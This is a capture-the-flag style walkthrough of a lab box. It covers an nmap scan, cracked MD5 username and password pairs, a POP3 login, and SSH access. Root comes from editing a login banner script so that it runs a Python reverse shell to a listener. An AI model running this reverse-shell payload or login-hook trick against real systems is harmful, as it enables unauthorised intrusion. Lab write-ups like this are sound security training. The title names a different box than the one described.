# GamingServer Write-Up

## Initial Enumeration

The only initial information provided is an IP address. We begin by conducting an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV -v {ip_address}
```

### Scan Results:
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)

80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))

110/tcp open  pop3    Dovecot pop3d

143/tcp open  imap    Dovecot imapd

## Web Enumeration

Navigating to the webpage hosted on port 80, there is a website under out of service, due to an attack. The important information is a the corporate twitter account which also got hacked

Going to twitter gives us a webpage that is a dump of usernames, hashes with the MD5 hashing algorithm and that POP3 is incredibly weak. Running the hashes through hashcracker gives the following credentials.

mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4:mailcall
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
tegel@fowsniff:1dc352435fecca338acfd4be10984009:apples01
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb:skyler22
seina@fowsniff:90dc16d47114aa13671c697fd506cf26:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd *NOT FOUND*
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11:orlando12
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e:07011972

### POP3 logging in

Running through the login credentials we are able to login to pop3 using seina credentials on telnet.


```bash
telnet {ip_address} 110
```

The first email gives the password for SSH.

The second email provides the username to login in with.


## SSH Access

```bash
ssh baksteen@{ip_address}
```

### Exploring the Directory

Given the hints, we find that baksteen belongs to the user group and has access to /opt/cube/cube.sh

Exploring into cube.sh reveals that it prints the fancy welcome screen when we SSH in. By editing the file, upon our login we can execute a command of choice. Using the one line python reverse shell, root access is freely given.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LOCAL_IP}",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Ending the SSH session and starting a nc listener

```bash
nc -lvnp 8080
```

Connecting back to SSH opens the root shell from the nc listener.

Ending our session we find our flag in root.txt
---
### TODO:
- Linux fundamentals for information gathering should be improved.
